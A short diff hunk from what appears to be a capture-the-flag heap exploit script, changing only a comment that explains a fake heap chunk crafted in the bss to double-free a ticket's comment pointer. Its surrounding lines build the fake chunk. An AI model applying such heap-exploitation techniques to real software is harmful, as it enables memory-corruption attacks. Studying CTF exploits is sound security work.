@@ -76,7 +76,7 @@ def pwn():
 	logout()
 
 	# craft fake heap chunk in the bss in order to double-free
-	# the comment pointer of sticket #1
+	# the comment pointer of sticket #1 via cancel(0)
 	chunk  = p64(0xb00bface)
 	# chunk's size
 	chunk += p64(0x21)
